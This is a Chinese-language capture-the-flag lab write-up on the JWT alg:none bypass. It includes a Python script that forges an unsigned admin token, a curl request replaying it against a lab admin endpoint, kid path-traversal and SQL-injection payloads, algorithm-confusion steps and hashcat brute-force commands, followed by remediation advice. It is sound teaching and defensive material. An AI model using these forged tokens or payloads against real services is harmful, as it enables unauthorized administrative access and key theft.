# JWT 的 alg:none 绕过

## 这一题在教什么

一个根本性的设计错误：

> **不应该让「被验证的东西」自己声明「怎么验证」。**

JWT 的头部里有 `alg` 字段。很多库（早期版本）会读它，然后按它去验签。
但头部和载荷一样，都是**攻击者写的**。让攻击者选算法，等于让他选「要不要验」。

`alg: none` 是这条链上最直白的一种利用：签名算法声明成「无」，服务端就放行。

## 一个 JWT 到底是什么

别被名字唬住。它就是三段 base64url，用 `.` 连起来：

```
<base64(头部)>.<base64(载荷)>.<base64(签名)>
```

- **头部**：`{"alg":"HS256","typ":"JWT"}`
- **载荷**：`{"user":"analyst","role":"viewer","exp":1730000000}`
- **签名**：`HMAC-SHA256(base64(头部) + "." + base64(载荷), 密钥)`

**base64 是编码，不是加密。** 头和载荷谁都能解开 —— 所以 JWT 里永远不要放敏感数据。

这一题的模块用标准库手搓了这套逻辑（没用 pyjwt），你可以直接读源码看每一段。

## 漏洞在哪

`module.py` 的 `verify()`：

```python
alg = str(header.get("alg", "")).strip().lower()

if alg == "none":          # ← 洞
    return payload          #   直接放行，一份签名都不验
```

服务端**信了 token 自己声明的算法**。

## 怎么打通

**一、先看清 token。**

```bash
# 按 . 拆成三段，逐段解码
echo '<第一段>' | base64 -d
echo '<第二段>' | base64 -d
```

头部里那个 `alg` 就是关键。

**二、自己拼一个 alg:none 的 token。**

```python
import base64, json

def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64e(json.dumps({"user": "mallory", "role": "admin"}).encode())
print(header + "." + payload + ".")
```

注意结尾那个点 —— 签名段是**空的**，但三段结构得在。

**三、拿它访问管理员接口。**

```bash
curl 'http://<靶场>/v/jwt/alg_none/api/admin/keys' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoibWFsbG9yeSIsInJvbGUiOiJhZG1pbiJ9.'
```

返回密钥列表就通了。

## 同类问题（换个目标都要试一遍）

**1. HS256 ↔ RS256 算法混淆**

服务端本来用 RS256（**公钥**验签、私钥签发）。你把它改成 HS256，
然后用**公钥**当 HMAC 密钥去签名。

公钥是公开的 —— 任何人都拿得到。所以你能签出通过验证的 token。

```python
# 拿到公钥（JWKS 端点 / 源码 / .well-known/jwks.json）
# 用公钥内容当 HMAC 密钥，alg 写成 HS256
```

**2. kid 参数注入**

`kid`（key id）告诉服务端用哪把密钥。如果它被拼进文件路径或 SQL：

```
{"kid": "../../../../dev/null", "alg": "HS256"}   # 密钥变成空字符串
{"kid": "key' UNION SELECT 'mykey' -- ", ...}     # 密钥变成你指定的
```

**3. 弱密钥爆破**

HS256 的密钥如果太短/是常见词：

```bash
hashcat -m 16500 token.txt wordlist.txt
# 或
flask-unsign --unsign --cookie ... --wordlist ...
```

**4. 不校验 exp**

签名对的旧 token 永远有效 —— 用户登出后 token 还能用。

## 怎么修

**1. 算法必须写死在服务端。**

```python
# 只接受一种
payload = jwt.decode(token, SECRET, algorithms=["HS256"])
```

`algorithms` 是**白名单**，绝不能从 token 里读。

```python
# 错误示范
alg = jwt.get_unverified_header(token)["alg"]
payload = jwt.decode(token, key, algorithms=[alg])   # ← 攻击者选的算法
```

**2. 别自己实现 JWT。** 用成熟库的当前版本（`pyjwt` / `python-jose`），
并及时升级 —— 这类洞在早期版本里非常普遍。

**3. 验签前先做结构校验。** 三段、头部是 JSON 对象、`alg` 在白名单里 ——
任何一条不满足就直接拒。

**4. 配套：**

- `exp` 必须校验；加 `nbf`（not before）和 `iat`
- 敏感操作加 **jti 黑名单**（登出 / 改密码后作废）
- 密钥轮换：头部带 `kid`，服务端从自己的密钥表里按 kid 取（**不是你给的路径**）
- 干脆换成 **PASETO / macaroon** 这类不给攻击者选算法机会的方案

## 顺手想想

- 如果 `alg` 字段被服务端写死成 HS256，但密钥是 `secret`，你还能怎么打？
  （提示：这跟前一道 Flask session 伪造是同一个思路）
- 「算法混淆」（RS256 公钥当 HS256 密钥）为什么能成立？
  根本原因是你把**两类不同用途的东西混用了**。
- JWT 是无状态的，这带来了什么安全问题？「登出」怎么实现？
- 为什么不能把 `role` 放在 JWT 里、然后每次请求都信它？
